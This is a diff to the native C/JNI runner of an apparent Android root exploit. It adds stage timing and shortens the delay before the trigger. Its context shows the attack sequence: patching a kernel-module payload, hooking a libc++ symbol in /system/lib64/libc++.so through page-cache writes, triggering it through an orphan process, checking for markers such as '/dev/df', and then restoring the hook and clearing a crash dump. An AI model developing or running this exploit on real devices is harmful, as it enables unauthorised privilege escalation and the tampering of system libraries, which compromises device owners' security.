@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 #include "exploit.h"
 
 static jmethodID report_mid;
@@ -31,6 +32,12 @@ void reportfmt(struct Reporter *r, const char *fmt, ...) {
 extern char libcxx_start[], libcxx_data[], libcxx_first_inst_copy[];
 extern uint32_t libcxx_len;
 
+static long monotonic_ms(void) {
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    return now.tv_sec * 1000L + now.tv_nsec / 1000000L;
+}
+
 JNIEXPORT jint JNICALL
 Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
         jobject reporter_obj, jstring ko_target_path, jint encap_port, jint spi,
@@ -38,6 +45,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
         jint sender_port, jboolean soft_reboot) {
     struct Reporter ro = {.env = env, .obj = reporter_obj};
     struct Reporter *reporter = &ro;
+    long total_started = monotonic_ms();
     uint8_t aes_key[32], hmac_key[32];
 
     jbyte *bytes = (*env)->GetByteArrayElements(env, aes_key_array, NULL);
@@ -56,16 +64,22 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
 
     struct PatchRestore libcxx_restore = {0};
     int rc = 3;
+    long stage_started = monotonic_ms();
     if (patch_ko(reporter)) goto done;
+    REPORTLN("[TIMING] stage=payload-patch elapsed_ms=%ld", monotonic_ms() - stage_started);
+    stage_started = monotonic_ms();
     if (patch_hook("/system/lib64/libc++.so",
             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
             reporter, &libcxx_restore)) goto done;
+    REPORTLN("[TIMING] stage=libcxx-hook elapsed_ms=%ld", monotonic_ms() - stage_started);
 
     rc = 2;
-    usleep(500000);
+    /* Page-cache writes are synchronous; only yield briefly before triggering init. */
+    usleep(5000);
     REPORTLN("* triggering...");
     create_orphan_process(reporter);
+    REPORTLN("[TIMING] stage=trigger-dispatch elapsed_ms=%ld", monotonic_ms() - stage_started);
 
     static const struct { const char *path, *msg; int rc; } markers[] = {
         {"/dev/df", "libc++: mutex acquired, loading custom module", -1},
@@ -90,5 +104,6 @@ done:
     restore_hook(&libcxx_restore, reporter);
     fadvise_drop(CRASH_DUMP_PATH, reporter);
     free(libcxx_restore.shell_orig);
+    REPORTLN("[TIMING] stage=total elapsed_ms=%ld", monotonic_ms() - total_started);
     return rc;
 }
